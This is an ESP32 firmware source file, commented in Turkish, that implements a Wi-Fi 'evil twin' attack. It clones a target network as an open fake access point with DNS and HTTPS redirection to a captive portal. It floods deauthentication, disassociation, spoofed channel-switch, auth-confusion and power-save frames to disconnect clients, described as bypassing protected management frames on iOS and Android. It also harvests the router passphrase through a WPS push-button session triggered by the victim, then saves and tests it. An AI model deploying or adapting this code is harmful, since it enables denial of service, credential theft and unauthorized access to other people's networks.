#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wps.h>
#include <DNSServer.h>
#include "evil_twin.h"
#include "definitions.h"
#include "passwords.h"
#include "types.h"
#include "web_interface.h"
#include "https_redirect.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
bool    evil_twin_active  = false;
String  evil_twin_ssid    = "";
int     evil_twin_clients = 0;
int     evil_twin_channel = 1;
uint8_t evil_twin_bssid[6] = {0};

// ─── WPS PBC durum değişkenleri ───────────────────────────────────────────────
bool et_wps_pbc_running  = false;
bool et_wps_pbc_found    = false;
char et_wps_pbc_pass[65] = {0};
static unsigned long et_wps_retry_after  = 0; // non-blocking retry timer
static unsigned long et_wps_stop_at      = 0; // WPS başarı → ET gecikmeli kapat

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static DNSServer dns_server;
static const uint8_t DNS_PORT = 53;
static deauth_frame_t et_frame;

static unsigned long et_last_retrack = 0;
static unsigned long et_last_csa     = 0;
static unsigned long et_last_led     = 0;
static unsigned long et_last_deauth  = 0;
static bool          et_led_state    = false;
static uint8_t       et_last_client[6] = {0};  // Son görülen hedef cihaz MAC

// ─── Bağımlılıklar ────────────────────────────────────────────────────────────
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// ─── WPS PBC Olay İşleyici ────────────────────────────────────────────────────
// Kullanıcı modemdeki WPS tuşuna bastığında modem PBC yayınlar;
// ESP32 STA arayüzü bu handshake'i yakalayarak şifreyi alır.
static bool et_wps_handler_registered = false;
static volatile int8_t et_wps_evt = 0;  // 0=bekliyor, 1=başarı, -1=hata/timeout
static unsigned long et_wps_started_ms = 0;
#define ET_WPS_PBC_TIMEOUT_MS  120000UL  // 2 dakika — kullanıcı tuşa basacak

static void et_wps_event_cb(void *arg, esp_event_base_t base,
                             int32_t id, void *data) {
  if (base != WIFI_EVENT) return;
  if (id == WIFI_EVENT_STA_WPS_ER_SUCCESS) {
    wifi_event_sta_wps_er_success_t *e = (wifi_event_sta_wps_er_success_t *)data;
    if (e && e->ap_cred_cnt > 0) {
      strncpy(et_wps_pbc_pass, (char *)e->ap_cred[0].passphrase, 64);
      et_wps_pbc_pass[64] = '\0';
    }
    et_wps_evt = 1;
  } else if (id == WIFI_EVENT_STA_WPS_ER_FAILED ||
             id == WIFI_EVENT_STA_WPS_ER_TIMEOUT) {
    et_wps_evt = -1;
  }
}

// ─── WPS PBC Başlat ──────────────────────────────────────────────────────────
// APSTA modunda STA arayüzü üzerinden WPS Push Button Config başlatır.
// AP + DNS kesintisiz çalışmaya devam eder.
void et_start_wps_pbc() {
  if (et_wps_pbc_running) return;

  et_wps_pbc_found   = false;
  et_wps_pbc_pass[0] = '\0';
  et_wps_evt         = 0;
  et_wps_started_ms  = millis();
  et_wps_pbc_running = true;

  // Sniferi durdur — STA arayüzünü WPS için serbest bırak
  esp_wifi_set_promiscuous(false);

  // Olay işleyiciyi kaydet (bir kez)
  if (!et_wps_handler_registered) {
    esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                               &et_wps_event_cb, nullptr);
    et_wps_handler_registered = true;
  }

  // STA'yı hedef AP'ye yönlendir — BSSID ve kanal sabitle
  wifi_config_t sta_cfg = {};
  snprintf((char *)sta_cfg.sta.ssid, sizeof(sta_cfg.sta.ssid),
           "%s", evil_twin_ssid.c_str());
  sta_cfg.sta.bssid_set = 1;
  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
  sta_cfg.sta.channel   = (uint8_t)evil_twin_channel;
  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);

  // WPS PBC modunu etkinleştir ve başlat
  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
  esp_wifi_wps_enable(&cfg);
  esp_wifi_wps_start(0);

  DEBUG_PRINTLN("ET WPS PBC: baslatildi — kullanici modemi WPS tusuna bassın");
}

// ─── WPS PBC Durdur ───────────────────────────────────────────────────────────
void et_stop_wps_pbc() {
  if (!et_wps_pbc_running) return;
  et_wps_pbc_running = false;
  et_wps_evt         = 0;
  et_wps_retry_after = 0;
  esp_wifi_wps_disable();
  DEBUG_PRINTLN("ET WPS PBC: durduruldu");
}

// ─── WPS PBC Döngüsü (evil_twin_loop içinden çağrılır) ───────────────────────
static void et_wps_pbc_loop() {
  if (!et_wps_pbc_running) return;

  unsigned long now = millis();

  // Retry bekleme süresi dolmadıysa çık
  if (et_wps_retry_after != 0) {
    if (now < et_wps_retry_after) return;
    // Süre doldu — yeniden başlat
    et_wps_retry_after = 0;
    // Sniffer WPS ile çakışır — retry öncesi mutlaka durdur
    esp_wifi_set_promiscuous(false);
    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
    esp_wifi_wps_enable(&cfg);
    esp_wifi_wps_start(0);
    et_wps_started_ms = now;
    return;
  }

  if (et_wps_evt == 1) {
    // Başarı — şifre yakalandı
    et_wps_pbc_running = false;
    et_wps_pbc_found   = true;
    esp_wifi_wps_disable();

    String pw = String(et_wps_pbc_pass);
    // Bazı routerlar plaintext passphrase'i WPS event'te göndermez;
    // WiFi STA config'den fallback olarak oku (IDF WiFi stack bunu doldurur)
    if (pw.length() == 0) {
      wifi_config_t sta_cfg = {};
      if (esp_wifi_get_config(WIFI_IF_STA, &sta_cfg) == ESP_OK) {
        pw = String((char *)sta_cfg.sta.password);
      }
    }
    if (pw.length() > 0) {
      passwords_save(evil_twin_ssid, pw);
      DEBUG_PRINT("ET WPS PBC basarili! Sifre: ");
      DEBUG_PRINTLN(pw);
      evil_twin_test_password(pw);
    } else {
      DEBUG_PRINTLN("ET WPS PBC: passphrase bos, kaydetme atlandi");
    }
    // Başarı sayfasının kurban tarafından alınmasına yetecek süre bekle,
    // sonra sahte AP'yi kapat. 8 saniye: JS 4s'de polling yapar + sayfa yükleme.
    et_wps_stop_at = millis() + 8000UL;
    DEBUG_PRINTLN("ET WPS PBC: 8s sonra Evil Twin durdurulacak");

  } else if (et_wps_evt == -1) {
    // Hata — 5 saniye sonra yeniden dene (non-blocking)
    DEBUG_PRINTLN("ET WPS PBC: hata, 5s sonra yeniden denenecek");
    et_wps_evt = 0;
    esp_wifi_wps_disable();
    et_wps_retry_after = now + 5000UL;

  } else if (now - et_wps_started_ms > ET_WPS_PBC_TIMEOUT_MS) {
    // 2 dakika geçti — 1 saniye sonra yeniden başlat (non-blocking)
    DEBUG_PRINTLN("ET WPS PBC: zaman asimi, yeniden baslaniyor");
    et_wps_evt = 0;
    esp_wifi_wps_disable();
    et_wps_retry_after = now + 1000UL;
  }
}

// ─── Evil Twin Sniffer — iOS/Android/Windows/eski cihaz tam uyumluluk ─────────
// AP→Station (4 reason kodu) + Station→AP spoof (bidirectional) + Broadcast
IRAM_ATTR static void et_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *pkt = (wifi_packet_t *)raw->payload;
  const mac_hdr_t *hdr = &pkt->hdr;

  if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;
  if (memcmp(hdr->dest, et_frame.sender, 6) != 0) return;

  memcpy(et_frame.station, hdr->src, 6);
  memcpy(et_last_client,   hdr->src, 6);

  // ── Yön 1: AP → Station (4 reason kodu, DEAUTH + DISASSOC) ────────────────
  // reason 7: class3 from non-assoc STA (iOS 14+, Android 12+ için en etkili)
  // reason 6: class2 from non-auth STA  (PMF bypass)
  // reason 2: prev-auth no longer valid  (eski cihazlar)
  // reason 3: leaving BSS               (evrensel fallback)
  static const uint8_t reasons[] = {7, 6, 2, 3};
  for (int r = 0; r < 4; r++) {
    et_frame.frame_control[0] = 0xC0;         // DEAUTH
    et_frame.reason = reasons[r];
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

    et_frame.frame_control[0] = 0xA0;         // DISASSOC (aynı reason)
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);
  }

  // ── Yön 2: Station → AP spoof (bidirectional) ──────────────────────────────
  // Gerçek AP'nin association tablosunu da temizler:
  // AP, cihazın bağlantıyı kendisinin kestiğini düşünür → yeniden auth gerekir
  {
    deauth_frame_t f_rev;
    memcpy(f_rev.access_point, evil_twin_bssid, 6); // BSSID = gerçek AP
    memcpy(f_rev.sender,       hdr->src,         6); // kaynak = cihaz MAC (spoof)
    memcpy(f_rev.station,      evil_twin_bssid,  6); // hedef  = gerçek AP

    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3; // DEAUTH leaving BSS
    for (int i = 0; i < 10; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);

    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8; // DISASSOC leaving BSS
    for (int i = 0; i < 10; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);
  }

  // ── Broadcast DEAUTH + DISASSOC (aynı kanalda diğer istemciler de düşer) ──
  memset(et_frame.station, 0xFF, 6);
  et_frame.frame_control[0] = 0xC0; et_frame.reason = 3;
  for (int i = 0; i < 6; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);
  et_frame.frame_control[0] = 0xA0;
  for (int i = 0; i < 6; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, &et_frame, sizeof(et_frame), false);

  // Çerçeveyi geri yükle
  memcpy(et_frame.station, hdr->src, 6);
  et_frame.frame_control[0] = 0xC0;
  et_frame.reason = 1;

  BLINK_LED(1, 10);
}

// ─── CSA Beacon (iOS PMF bypass) ─────────────────────────────────────────────
IRAM_ATTR static void et_send_csa_beacon() {
  const uint8_t *bssid   = evil_twin_bssid;
  const char    *ssid    = evil_twin_ssid.c_str();
  uint8_t        ssid_len = (uint8_t)evil_twin_ssid.length();
  uint8_t        channel  = (uint8_t)evil_twin_channel;

  uint8_t buf[128];
  uint8_t *p = buf;

  *p++ = 0x80; *p++ = 0x00;
  *p++ = 0x00; *p++ = 0x00;
  memset(p, 0xFF, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  memcpy(p, bssid, 6); p += 6;
  *p++ = 0x00; *p++ = 0x00;

  memset(p, 0, 8); p += 8;
  *p++ = 0x64; *p++ = 0x00;
  *p++ = 0x11; *p++ = 0x04;

  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  // CSA IE (ID=37) — kanal 14'e geç, modern öncesi cihazlar
  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01; *p++ = 0x0E; *p++ = 0x01; // Mode1, Ch14, Count1

  // ECSA IE (ID=60/0x3C) — Extended CSA, modern chipset'ler için zorunlu
  *p++ = 0x3C; *p++ = 0x04;
  *p++ = 0x01;  // Mode 1 (TX durdur)
  *p++ = 0x51;  // Operating class 81 (2.4 GHz)
  *p++ = 0x0E;  // Kanal 14 (geçersiz → cihaz bağlantıyı keser)
  *p++ = 0x01;  // Count 1

  // Quiet IE (ID=40/0x28) — beacon sırasında tüm TX'leri durdurur
  // Android + iOS: PM kuyruğunu boşaltır, bağlantı kopar
  *p++ = 0x28; *p++ = 0x06;
  *p++ = 0x01;         // Quiet count: 1 TBTT
  *p++ = 0x01;         // Quiet period: her beacon'da
  *p++ = 0xFF; *p++ = 0x7F; // Quiet duration: maksimum
  *p++ = 0x00; *p++ = 0x00; // Quiet offset: 0

  int flen = (int)(p - buf);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, buf, flen, false);
    delayMicroseconds(400);
  }
}

// ─── Yardımcı: Auth confusion (0xB0) — modern cihazlar için ─────────────────
// AP→STA: "too many stations" (code 13) auth yanıtı → 802.11 state machine reset
// iOS 14 öncesi + Android + Windows'da PMF olmasa bile etkilidir
IRAM_ATTR static void et_send_auth_confusion(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[30];
  uint8_t *p = buf;
  *p++ = 0xB0; *p++ = 0x00;          // Auth frame control
  *p++ = 0x3A; *p++ = 0x01;          // Duration
  memcpy(p, sta,   6); p += 6;       // DA: hedef cihaz
  memcpy(p, bssid, 6); p += 6;       // SA: AP (spoofed)
  memcpy(p, bssid, 6); p += 6;       // BSSID: AP
  *p++ = 0x00; *p++ = 0x00;          // Seq ctrl
  *p++ = 0x00; *p++ = 0x00;          // Algorithm: Open System
  *p++ = 0x02; *p++ = 0x00;          // Seq: 2 (auth response)
  *p++ = 0x0D; *p++ = 0x00;          // Status 13: too many stations
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

// ─── Yardımcı: NULL data power-save spoof — modern iOS/Android ────────────────
// STA→AP (spoof): Power Management bit=1 → AP cihazın uyuduğunu düşünür,
// veri göndermez → cihaz zaman aşımıyla bağlantıyı keser
IRAM_ATTR static void et_send_null_powerdown(const uint8_t *bssid, const uint8_t *sta) {
  uint8_t buf[24];
  uint8_t *p = buf;
  *p++ = 0x48; *p++ = 0x11;          // Null data, ToDS=1, Power Mgmt=1
  *p++ = 0x00; *p++ = 0x00;          // Duration
  memcpy(p, bssid, 6); p += 6;       // Addr1: AP (destination)
  memcpy(p, sta,   6); p += 6;       // Addr2: STA (source, spoofed)
  memcpy(p, bssid, 6); p += 6;       // Addr3: AP BSSID
  *p++ = 0x00; *p++ = 0x00;          // Seq ctrl
  int len = (int)(p - buf);
  for (int i = 0; i < 10; i++)
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

// ─── Proaktif deauth — gerçek AP'ten tüm cihazları düşürür ──────────────────
// Broadcast (4 reason) + hedefli (4 reason, iki yön) — her 2 saniyede tetiklenir
IRAM_ATTR static void et_send_proactive_deauth() {
  // TX gücünü zorla sabitle; PS'yi WPS handshake sırasında dokunma
  esp_wifi_set_max_tx_power(84);
  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);

  static const uint8_t zero[6]    = {0};
  static const uint8_t reasons[4] = {7, 6, 2, 3};
  deauth_frame_t f = et_frame;

  // 1. Broadcast DEAUTH + DISASSOC — 4 farklı reason kodu
  memset(f.station, 0xFF, 6);
  for (int r = 0; r < 4; r++) {
    f.frame_control[0] = 0xC0; f.reason = reasons[r];
    for (int i = 0; i < 8; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
    f.frame_control[0] = 0xA0;
    for (int i = 0; i < 8; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
  }

  if (memcmp(et_last_client, zero, 6) != 0) {
    // 2. AP → Station (hedefli, 4 reason)
    memcpy(f.station, et_last_client, 6);
    for (int r = 0; r < 4; r++) {
      f.frame_control[0] = 0xC0; f.reason = reasons[r];
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
      f.frame_control[0] = 0xA0;
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
        esp_wifi_80211_tx(WIFI_IF_AP, &f, sizeof(f), false);
    }

    // 3. Station → AP spoof (bidirectional) — gerçek AP tablosunu temizler
    deauth_frame_t f_rev;
    memcpy(f_rev.access_point, evil_twin_bssid,  6); // BSSID = gerçek AP
    memcpy(f_rev.sender,       et_last_client,   6); // kaynak = cihaz (spoof)
    memcpy(f_rev.station,      evil_twin_bssid,  6); // hedef  = gerçek AP
    f_rev.frame_control[0] = 0xC0; f_rev.reason = 3;
    for (int i = 0; i < 10; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);
    f_rev.frame_control[0] = 0xA0; f_rev.reason = 8;
    for (int i = 0; i < 10; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &f_rev, sizeof(f_rev), false);

    // 4. Auth confusion + NULL power-save — modern iOS/Android/Windows
    et_send_auth_confusion(evil_twin_bssid, et_last_client);
    et_send_null_powerdown(evil_twin_bssid, et_last_client);
  }
}

// ─── İç yardımcı: sniferi başlat ─────────────────────────────────────────────
static void et_start_sniffer() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&et_sniffer);
}

// ─── Evil Twin başlat ─────────────────────────────────────────────────────────
void start_evil_twin(int wifi_number) {
  evil_twin_ssid    = WiFi.SSID(wifi_number);
  evil_twin_channel = WiFi.channel(wifi_number);
  memcpy(evil_twin_bssid, WiFi.BSSID(wifi_number), 6);
  evil_twin_clients = 0;
  evil_twin_active  = true;
  et_last_retrack   = millis();
  et_last_csa       = millis();

  DEBUG_PRINT("Evil Twin: ");
  DEBUG_PRINTLN(evil_twin_ssid);

  // Mevcut promiscuous'ı durdur
  esp_wifi_set_promiscuous(false);

  // Deauth çerçevesini ayarla
  et_frame.reason = 1;
  memcpy(et_frame.access_point, evil_twin_bssid, 6);
  memcpy(et_frame.sender,       evil_twin_bssid, 6);

  // APSTA modu — zaten APSTA'daysa WiFi.mode() çağrılmaz (WiFi stack'i sıfırlar, ~300ms ekler)
  wifi_mode_t cur_mode = WIFI_MODE_NULL;
  esp_wifi_get_mode(&cur_mode);
  if (cur_mode != WIFI_MODE_APSTA) {
    WiFi.mode(WIFI_MODE_APSTA);
  }
  WiFi.setAutoReconnect(false);  // Auto-reconnect WPS'i bozar — devre dışı
  WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);

  // AP'nin başlamasını bekle — mod değişimi olmadığında daha kısa süre yeterli
  delay(cur_mode == WIFI_MODE_APSTA ? 80 : 150);
  apply_max_performance();

  // DNS: tüm sorguları 192.168.4.1'e yönlendir
  dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  et_start_sniffer();

  // HTTPS → HTTP yönlendirme (port 443) — TLS bağlantılarını captive portal'a çeker
  https_redirect_start();

  // WPS PBC'yi otomatik başlat — kurban portaldaki WPS tuşuna bastığında
  // ESP32 hazır bekliyor olsun; manuel admin panel adımına gerek kalmasın.
  et_start_wps_pbc();
}

// ─── Şifre testi — AP KAPANMAZ ────────────────────────────────────────────────
// APSTA modunda STA arayüzü ayrı çalışır: AP ve DNS kesintisiz devam eder.
bool evil_twin_test_password(const String &password) {
  DEBUG_PRINT("Sifre deneniyor: ");
  DEBUG_PRINTLN(password);

  // Auto-reconnect kapalı tut — disconnect sonrası otomatik bağlantı WPS'i bozar
  WiFi.setAutoReconnect(false);

  // Sniferi durdur (STA bağlantısı snifer ile çakışır)
  esp_wifi_set_promiscuous(false);
  // DNS + AP çalışmaya DEVAM EDİYOR — WiFi.mode() ÇAĞIRILMIYOR

  // Düşük seviyeli STA yapılandırma — AP arayüzünü etkilemez
  wifi_config_t sta_cfg = {};
  snprintf((char *)sta_cfg.sta.ssid,     sizeof(sta_cfg.sta.ssid),     "%s", evil_twin_ssid.c_str());
  snprintf((char *)sta_cfg.sta.password, sizeof(sta_cfg.sta.password), "%s", password.c_str());
  sta_cfg.sta.bssid_set = 1;
  memcpy(sta_cfg.sta.bssid, evil_twin_bssid, 6);
  sta_cfg.sta.channel = (uint8_t)evil_twin_channel;

  esp_wifi_set_config(WIFI_IF_STA, &sta_cfg);
  esp_wifi_connect();

  // Test süresi boyunca web sunucusu çalışmaya devam eder
  unsigned long t = millis();
  bool connected = false;
  while (millis() - t < ET_TEST_TIMEOUT_MS) {
    wl_status_t s = WiFi.status();
    if (s == WL_CONNECTED)      { connected = true; break; }
    if (s == WL_CONNECT_FAILED) break;
    delay(80);
    web_interface_handle_client();
    dns_server.processNextRequest();
  }
  esp_wifi_disconnect();

  // STA bağlantısı TX power ve PS ayarlarını sıfırlayabilir — geri yükle
  apply_max_performance();

  if (!connected) {
    // AP hâlâ ayakta, sniferi yeniden başlat
    delay(200);
    et_start_sniffer();
  }
  return connected;
}

// ─── Hedef yeniden bulma (router resetlenirse) ────────────────────────────────
static void et_retrack() {
  DEBUG_PRINT("ET Hedef taraniyor: ");
  DEBUG_PRINTLN(evil_twin_ssid);

  esp_wifi_set_promiscuous(false);

  // Async olmayan kısa tarama
  int n = WiFi.scanNetworks(false, true, false, 120);
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == evil_twin_ssid) {
      int new_ch = WiFi.channel(i);
      bool changed = (new_ch != evil_twin_channel) ||
                     (memcmp(WiFi.BSSID(i), evil_twin_bssid, 6) != 0);
      if (changed) {
        evil_twin_channel = new_ch;
        memcpy(evil_twin_bssid, WiFi.BSSID(i), 6);
        memcpy(et_frame.access_point, evil_twin_bssid, 6);
        memcpy(et_frame.sender,       evil_twin_bssid, 6);
        // Sahte AP kanalını güncelle (AP kapanmadan)
        WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
        // Kanal değişiminden sonra maks performansı geri uygula
        apply_max_performance();
        DEBUG_PRINTF("ET yeni kanal: %d\n", evil_twin_channel);
      }
      break;
    }
  }
  WiFi.scanDelete();
  et_start_sniffer();
}

// ─── Evil Twin döngüsü (main loop'tan çağrılır) ───────────────────────────────
void evil_twin_loop() {
  if (!evil_twin_active) return;

  dns_server.processNextRequest();
  evil_twin_clients = WiFi.softAPgetStationNum();

  // WPS PBC arka plan kontrolü — önce çalıştır, kritik yol
  et_wps_pbc_loop();

  // WPS başarı sonrası gecikmeli ET kapatma: başarı sayfası kurbanın tarayıcısına
  // ulaşsın diye 8 saniye beklenir, sonra sahte AP tamamen kapanır.
  if (et_wps_stop_at && millis() >= et_wps_stop_at) {
    et_wps_stop_at = 0;
    DEBUG_PRINTLN("ET WPS PBC: gecikme doldu, Evil Twin kapatılıyor");
    stop_evil_twin();
    return;
  }

  unsigned long now = millis();

  // ── CSA beacon + Proaktif deauth — WPS çalışırken de gönderilir ─────────────
  // Deauth: WIFI_IF_AP üzerinden gönderilir, WPS'in kullandığı WIFI_IF_STA
  //         arayüzünden tamamen bağımsızdır — ikisi çakışmaz.
  // Reaktif deauth (et_sniffer callback): WPS aktifken promiscuous kapalı
  //         olduğundan zaten tetiklenmez — bu sorun değil; proaktif deauth yeterli.
  // WiFi.scanNetworks() gerçekten WPS'i bozar, bu yüzden retrack engellenir.
  //
  // Önceki hata: if(!et_wps_pbc_running) guard'ı hem deauth hem CSA'yı engelliyordu.
  // WPS PBC çalıştığı sürece (her zaman — timeout sonrası da yeniden başlıyor)
  // deauth hiç gönderilmiyordu. Düzeltme: guard kaldırıldı, sadece retrack'te kalıyor.

  // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
  if (now - et_last_csa >= CSA_INTERVAL_MS) {
    et_last_csa = now;
    et_send_csa_beacon();
  }

  // Proaktif deauth: her ET_DEAUTH_INTERVAL_MS ms'de bir
  // Hedef cihazı gerçek AP'ye bağlanmadan önce düşürür → sahte AP'ye yönlendirir
  if (now - et_last_deauth >= ET_DEAUTH_INTERVAL_MS) {
    et_last_deauth = now;
    et_send_proactive_deauth();
  }

  // Hedef yeniden bulma: RETRACK_INTERVAL_MS'de bir
  // WiFi.scanNetworks() WPS PBC'yi GERÇEKTEN bozar — guard burada kalır.
  if (!et_wps_pbc_running && now - et_last_retrack >= RETRACK_INTERVAL_MS) {
    et_last_retrack = now;
    et_retrack();
  }

  // TX gücü: her loop iterasyonunda zorla uygula
  // PS: WPS PBC handshake aktifken dokunma — STA state machine'ini bozar
  esp_wifi_set_max_tx_power(84);
  if (!et_wps_pbc_running) esp_wifi_set_ps(WIFI_PS_NONE);

  // LED: 500ms aralıkla yanıp söner — ET aktif göstergesi
  if (now - et_last_led >= 500) {
    et_last_led  = now;
    et_led_state = !et_led_state;
#ifdef LED
    digitalWrite(LED, et_led_state ? HIGH : LOW);
#endif
  }
}

// ─── Evil Twin durdur ─────────────────────────────────────────────────────────
void stop_evil_twin() {
  DEBUG_PRINTLN("Evil Twin durduruluyor...");
  evil_twin_active  = false;
  evil_twin_ssid    = "";
  evil_twin_clients = 0;
  et_led_state      = false;
  memset(et_last_client, 0, 6);  // Hedef MAC sıfırla
  led_off();

  // WPS PBC varsa durdur; gecikmeli stop timer'ı da sıfırla
  et_wps_stop_at = 0;
  if (et_wps_pbc_running) {
    et_wps_pbc_running = false;
    et_wps_evt         = 0;
    et_wps_retry_after = 0;
    esp_wifi_wps_disable();
  }

  esp_wifi_set_promiscuous(false);
  dns_server.stop();
  https_redirect_stop();

  WiFi.softAPdisconnect(true);
  delay(150);
  // WIFI_MODE_AP yerine APSTA — WPS saldırısına geçiş için mod değişimi olmasın
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAP(AP_SSID, AP_PASS);
}
